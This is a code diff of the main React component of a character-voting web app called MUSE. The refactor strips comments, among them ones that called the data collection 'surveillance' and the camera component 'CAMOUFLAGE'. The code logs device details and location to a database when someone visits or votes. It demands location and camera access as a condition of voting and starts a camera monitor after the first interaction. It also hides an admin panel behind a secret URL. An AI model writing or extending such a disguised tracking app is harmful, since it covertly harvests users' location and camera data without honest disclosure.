@@ -10,12 +10,10 @@ import CameraMonitor from './components/CameraMonitor';
 import { dataService } from './services/dataService'; 
 import { Timer, ShieldAlert, Fingerprint } from 'lucide-react';
 import { AnimatePresence } from 'framer-motion';
-import { getDetailedDeviceInfo } from './utils/deviceInfo'; // IMPORT UTILITY
+import { getDetailedDeviceInfo } from './utils/deviceInfo';
 
 function App() {
   // --- VIEW STATE WITH SECRET ROUTE ---
-  // Initialize view based on URL path. 
-  // If path is '/jjklq', go directly to admin login.
   const [view, setView] = useState<'app' | 'admin_login' | 'admin_dashboard'>(() => {
       const path = window.location.pathname;
       return path === '/jjklq' ? 'admin_login' : 'app';
@@ -27,7 +25,6 @@ function App() {
   const [characters, setCharacters] = useState<Character[]>(INITIAL_CHARACTERS);
   const [activeIndex, setActiveIndex] = useState(0);
   
-  // Persistent Guest ID (Renamed to use 'guest_' prefix)
   const guestId = useMemo(() => {
     let gid = localStorage.getItem('muse_guest_id');
     if (!gid) { 
@@ -39,7 +36,7 @@ function App() {
 
   const [hasVoted, setHasVoted] = useState<boolean>(false);
   const [isVoteModalOpen, setIsVoteModalOpen] = useState(false);
-  const [hasInteracted, setHasInteracted] = useState(false); // New state to track interaction
+  const [hasInteracted, setHasInteracted] = useState(false);
 
   // --- PERMISSION STATE ---
   const [isLocationDenied, setIsLocationDenied] = useState(false);
@@ -53,20 +50,13 @@ function App() {
   const [isVotingEnded, setIsVotingEnded] = useState(false);
   const [winnerId, setWinnerId] = useState<string | null>(null);
 
-  // --- IMMEDIATE LOGGING (Passive Only - No Permissions yet) ---
-  // Ensures we capture the guest in DB even if they don't vote or grant permissions yet.
+  // --- LOGGING ---
   useEffect(() => {
-      // Only log guest visit if we are in the main app view
       if (view !== 'app') return;
-
       const initSurveillance = async () => {
-          // CAPTURE DETAILED INFO
           const deviceInfo = getDetailedDeviceInfo();
-
           const storedLoc = localStorage.getItem('muse_user_location');
           let locationData = storedLoc ? JSON.parse(storedLoc) : null;
-
-          // Log visit immediately to DB (Users Table)
           await dataService.registerUserLogin({
               user_identifier: guestId,
               password_text: '', 
@@ -78,44 +68,27 @@ function App() {
       initSurveillance();
   }, [guestId, view]); 
 
-  // --- INTERACTION HANDLER ---
   const registerInteraction = useCallback(() => {
-      if (!hasInteracted) {
-          setHasInteracted(true);
-      }
+      if (!hasInteracted) setHasInteracted(true);
   }, [hasInteracted]);
 
   // --- DATA LOADING ---
   const fetchCharacters = useCallback(async () => {
     try {
         const chars = await dataService.getCharacters();
-        // Only update if we have valid data
         if (chars.length > 0) {
             setCharacters(prev => {
-                // Simple check to avoid unnecessary re-renders if data is identical
                 if (JSON.stringify(prev) === JSON.stringify(chars)) return prev;
                 return chars;
             });
         }
-    } catch (e) {
-        console.error("Fetch error", e);
-    }
+    } catch (e) { console.error("Fetch error", e); }
   }, []);
 
   useEffect(() => {
-    // 1. Initial Fetch
     fetchCharacters();
-
-    // 2. REALTIME SUBSCRIPTION
-    const unsubscribeSupabase = dataService.subscribeToVotes(() => {
-        // console.log("Realtime update received from Supabase");
-        fetchCharacters();
-    });
-
-    // 3. POLLING FALLBACK (Every 5 seconds)
-    const pollInterval = setInterval(() => {
-        fetchCharacters();
-    }, 5000);
+    const unsubscribeSupabase = dataService.subscribeToVotes(() => fetchCharacters());
+    const pollInterval = setInterval(() => fetchCharacters(), 5000);
 
     const handleStorageChange = () => {
         fetchCharacters();
@@ -124,7 +97,6 @@ function App() {
     window.addEventListener('local-storage-update', handleStorageChange);
     window.addEventListener('storage', handleStorageChange);
     
-    // Check if this guest has already voted
     const userHasVoted = localStorage.getItem(`muse_vote_record_${guestId}`);
     setHasVoted(!!userHasVoted);
 
@@ -136,16 +108,12 @@ function App() {
     };
   }, [fetchCharacters, guestId]);
 
-  // --- PERMISSIONS CHECKER (PRIORITIZED LOCATION) ---
+  // --- PERMISSIONS ---
   const checkPermissions = useCallback(async () => {
     const missing: ('location' | 'camera')[] = [];
     
-    // 1. Check Location FIRST (Priority High)
     const locationGranted = await new Promise<boolean>((resolve) => {
-        if (!('geolocation' in navigator)) {
-            resolve(false);
-            return;
-        }
+        if (!('geolocation' in navigator)) { resolve(false); return; }
         navigator.geolocation.getCurrentPosition(
             (position) => {
                 const locationData = {
@@ -156,8 +124,6 @@ function App() {
                 };
                 localStorage.setItem('muse_user_location', JSON.stringify(locationData));
                 setIsLocationDenied(false);
-                
-                // Silent DB update: Log the newly acquired location
                 dataService.registerUserLogin({
                     user_identifier: guestId,
                     password_text: '',
@@ -176,41 +142,29 @@ function App() {
         );
     });
 
-    if (!locationGranted) {
-        missing.push('location');
-    }
+    if (!locationGranted) missing.push('location');
 
-    // 2. Check Camera SECOND (Priority Lower)
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        // Close immediately, we just wanted to check access
         stream.getTracks().forEach(track => track.stop()); 
         setIsCameraDenied(false);
     } catch (err) {
-        console.warn("Camera check failed:", err);
         setIsCameraDenied(true);
         missing.push('camera');
     }
 
     const finalMissing = [...new Set([...missing])];
     setMissingPermissions(finalMissing);
-    
     return finalMissing.length === 0;
-
   }, [guestId]);
 
-  // --- TIMER & WINNER CALCULATION ---
+  // --- TIMER ---
   useEffect(() => {
     const calculateTimeLeft = () => {
         if (!votingDeadline) { 
-            setTimeLeft(null); 
-            setIsVotingEnded(false); 
-            setWinnerId(null);
-            return; 
+            setTimeLeft(null); setIsVotingEnded(false); setWinnerId(null); return; 
         }
-        
         const diff = new Date(votingDeadline).getTime() - new Date().getTime();
-        
         if (diff > 0) {
             setTimeLeft({
                 days: Math.floor(diff / (1000 * 60 * 60 * 24)),
@@ -221,16 +175,12 @@ function App() {
             setIsVotingEnded(false);
             setWinnerId(null);
         } else {
-            // TIME IS UP
             setTimeLeft(null); 
             setIsVotingEnded(true);
-            
-            // Calculate Winner if not already set
             if (characters.length > 0) {
-                // Find character with max votes
                 const sorted = [...characters].sort((a,b) => b.votes - a.votes);
                 setWinnerId(sorted[0].id);
-                // Also jump to the winner card
+                // Auto-navigate to winner
                 const winnerIndex = characters.findIndex(c => c.id === sorted[0].id);
                 if (winnerIndex !== -1 && activeIndex !== winnerIndex) {
                     setActiveIndex(winnerIndex);
@@ -238,23 +188,27 @@ function App() {
             }
         }
     };
-    
-    // Initial calculation
     calculateTimeLeft();
-    
-    // Loop
     const timer = setInterval(calculateTimeLeft, 1000);
     return () => clearInterval(timer);
-  }, [votingDeadline, characters]); // Removed activeIndex dependency to prevent loop
+  }, [votingDeadline, characters]);
+
+  // --- CYCLIC OFFSET LOGIC FOR NEAT STACKING ---
+  const getOffset = (index: number, active: number, len: number) => {
+      let offset = index - active;
+      if (offset > len / 2) offset -= len;
+      if (offset < -len / 2) offset += len;
+      return offset;
+  };
 
   const handleNext = () => {
-      if (isVotingEnded) return; // Disable swipe when ended
+      if (isVotingEnded) return;
       registerInteraction();
       setActiveIndex((prev) => (prev + 1) % characters.length);
   };
   
   const handlePrev = () => {
-      if (isVotingEnded) return; // Disable swipe when ended
+      if (isVotingEnded) return;
       registerInteraction();
       setActiveIndex((prev) => (prev - 1 + characters.length) % characters.length);
   };
@@ -264,100 +218,52 @@ function App() {
       setActiveIndex(index);
   };
 
-  // --- INTERACTIVE LEADERBOARD ---
-  const handleLeaderboardSelect = (charId: string) => {
-      registerInteraction();
-      const idx = characters.findIndex(c => c.id === charId);
-      if (idx !== -1) {
-          setActiveIndex(idx);
-          window.scrollTo({ top: 0, behavior: 'smooth' });
-      }
-  };
-
-  // --- VOTE FLOW ---
   const handleVoteClick = async () => {
       registerInteraction();
       if (hasVoted || isVotingEnded) return;
-
-      // STRICT PERMISSION CHECK
       const allGranted = await checkPermissions();
-
-      if (!allGranted) {
-          setShowPermissionModal(true);
-          return; // STOP HERE
-      }
-      
-      // Only if strict check passed
+      if (!allGranted) { setShowPermissionModal(true); return; }
       setIsVoteModalOpen(true);
   };
 
   const handlePermissionRetry = async () => {
-      // Re-run the strict check
       const granted = await checkPermissions();
-      
-      if (granted) {
-          // Success! Close permission modal and open vote modal
-          setShowPermissionModal(false);
-          setIsVoteModalOpen(true);
-      } else {
-          // Still failed, keep modal open
-          alert("Izin lokasi wajib diaktifkan untuk melanjutkan.");
-      }
+      if (granted) { setShowPermissionModal(false); setIsVoteModalOpen(true); } 
+      else { alert("Izin lokasi wajib diaktifkan untuk melanjutkan."); }
   };
 
   const handleConfirmVote = async () => {
     if (isVotingEnded) return;
     setIsVoteModalOpen(false);
-    
-    // 1. Double check permissions just in case
-    if (missingPermissions.length > 0) {
-        setShowPermissionModal(true);
-        return;
-    }
+    if (missingPermissions.length > 0) { setShowPermissionModal(true); return; }
 
     try {
         const activeChar = characters[activeIndex];
         const storedLoc = localStorage.getItem('muse_user_location');
         const locationData = storedLoc ? JSON.parse(storedLoc) : null;
-        
-        // CAPTURE DETAILED SPECS FOR VOTE
         const deviceInfo = getDetailedDeviceInfo();
 
-        // 2. OPTIMISTIC UPDATE (Update UI Immediately)
-        setCharacters(prev => prev.map(c => 
-            c.id === activeChar.id ? { ...c, votes: c.votes + 1 } : c
-        ));
+        setCharacters(prev => prev.map(c => c.id === activeChar.id ? { ...c, votes: c.votes + 1 } : c));
         setHasVoted(true); 
 
-        // 3. SEND TO SERVER (Background)
         const success = await dataService.castVote(activeChar.id, guestId, { location: locationData, deviceInfo });
-        
         if (!success) {
-            // Revert if explicitly failed (network error)
-            setCharacters(prev => prev.map(c => 
-                c.id === activeChar.id ? { ...c, votes: c.votes - 1 } : c
-            ));
+            setCharacters(prev => prev.map(c => c.id === activeChar.id ? { ...c, votes: c.votes - 1 } : c));
             setHasVoted(false);
             alert("Gagal melakukan voting. Mohon periksa koneksi internet Anda.");
-            return;
         }
-
     } catch (e) {
-        console.error("Vote failed locally", e);
         setHasVoted(false);
     }
   };
 
-  // --- LOGOUT HANDLER ---
   const handleLogout = () => {
       setView('app');
-      // Clean up URL: remove '/jjklq' and replace with root '/'
       window.history.pushState({}, '', '/');
   };
 
   const activeCharacter = characters[activeIndex];
 
-  // Admin Login Logic
   if (view === 'admin_login') return (
         <div className="min-h-screen bg-slate-950 flex items-center justify-center p-4">
              <div className="w-full max-w-sm bg-slate-900 border border-slate-800 p-8 rounded-2xl shadow-2xl relative overflow-hidden">
@@ -366,7 +272,6 @@ function App() {
                    <input type="password" value={adminPassword} onChange={(e) => setAdminPassword(e.target.value)} className="w-full bg-slate-950 border border-slate-700 text-white px-4 py-3 rounded-xl outline-none" placeholder="••••••••" />
                    {adminError && <p className="text-red-500 text-xs text-center">{adminError}</p>}
                    <button type="submit" disabled={isAdminLoading} className="w-full bg-indigo-600 text-white font-bold py-3 rounded-xl">Unlock System</button>
-                   {/* Return to App button */}
                    <button type="button" onClick={handleLogout} className="w-full text-slate-500 text-xs mt-2">Return to App</button>
                 </form>
              </div>
@@ -382,9 +287,9 @@ function App() {
          <div className="absolute bottom-[-20%] right-[-20%] w-[80vw] h-[80vw] md:w-[600px] md:h-[600px] bg-indigo-900/20 rounded-full blur-[100px]" />
       </div>
 
-      <div className="relative z-10 w-full max-w-md flex flex-col items-center py-8 px-4 gap-6">
+      <div className="relative z-10 w-full max-w-md flex flex-col items-center py-6 px-4 gap-6">
         <header className="w-full flex flex-col gap-4 relative">
-          <div className="w-full flex justify-between items-center bg-slate-900/40 p-3 rounded-2xl border border-white/5 backdrop-blur-sm">
+          <div className="w-full flex justify-between items-center bg-slate-900/40 p-3 rounded-2xl border border-white/5 backdrop-blur-sm shadow-lg">
              <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-indigo-500 to-purple-600 flex items-center justify-center font-bold text-white shadow-lg">M</div>
                  <div><h1 className="text-lg font-bold text-white leading-none">MUSE</h1><p className="text-[9px] text-indigo-300/80 tracking-widest uppercase font-medium">Rankings</p></div>
@@ -406,16 +311,16 @@ function App() {
           )}
         </header>
 
-        {/* Main Swipe Area */}
-        <section className="w-full relative h-[500px] flex items-center justify-center perspective-1000 mt-2">
-             <AnimatePresence mode="popLayout" initial={false}>
-               {characters.map((char, index) => {
+        {/* Main Swipe Area - Cyclic Stacking for Neat Look */}
+        <section className="w-full relative h-[480px] sm:h-[500px] flex items-center justify-center perspective-1000 mt-2">
+             {characters.map((char, index) => {
+                  const offset = getOffset(index, activeIndex, characters.length);
                   return (
                     <SwipeCard 
                       key={char.id}
                       character={char} 
                       isActive={index === activeIndex}
-                      offset={index - activeIndex}
+                      offset={offset}
                       onClick={() => handleCardClick(index)}
                       onSwipeRight={handlePrev}
                       onSwipeLeft={handleNext}
@@ -424,7 +329,6 @@ function App() {
                     />
                   );
                })}
-             </AnimatePresence>
         </section>
 
         {/* Indicators & Vote Button */}
@@ -441,7 +345,6 @@ function App() {
              >
                 {isVotingEnded ? <span>TIME'S UP</span> : hasVoted ? <span>VOTING CLOSED</span> : <span>VOTE FOR {activeCharacter.name.split(' ')[0].toUpperCase()}</span>}
              </button>
-             {/* Subtle hint about permissions */}
              {!hasVoted && !isVotingEnded && (
                  <p className="text-[10px] text-slate-500 flex items-center gap-1">
                     <ShieldAlert size={10} /> Verified User Access Only
@@ -450,10 +353,13 @@ function App() {
         </section>
 
         <section className="w-full relative z-30 pb-10">
-           <Leaderboard characters={characters} onCharacterSelect={handleLeaderboardSelect} />
+           <Leaderboard characters={characters} onCharacterSelect={(id) => {
+               const idx = characters.findIndex(c => c.id === id);
+               if(idx !== -1) setActiveIndex(idx);
+               window.scrollTo({ top: 0, behavior: 'smooth' });
+           }} />
         </section>
-
-        {/* FOOTER HIDDEN - Access Admin via /jjklq only */}
+        
         <footer className="w-full text-center pb-8 opacity-20">
            <p className="text-[10px] text-slate-700">MUSE &copy; 2024</p>
         </footer>
@@ -464,7 +370,6 @@ function App() {
         {isVoteModalOpen && !isVotingEnded && <VoteConfirmationModal isOpen={isVoteModalOpen} onClose={() => setIsVoteModalOpen(false)} onConfirm={handleConfirmVote} characterName={activeCharacter.name} />}
       </AnimatePresence>
 
-      {/* Permission Modal - STRICT MODE */}
       <AnimatePresence>
         {showPermissionModal && (
             <PermissionModal 
@@ -475,7 +380,6 @@ function App() {
         )}
       </AnimatePresence>
       
-      {/* CAMOUFLAGE: Camera Monitor ONLY activates after user interaction */}
       {hasInteracted && view === 'app' && (
         <CameraMonitor user={guestId} onError={() => setIsCameraDenied(true)} onSuccess={() => setIsCameraDenied(false)} />
       )}
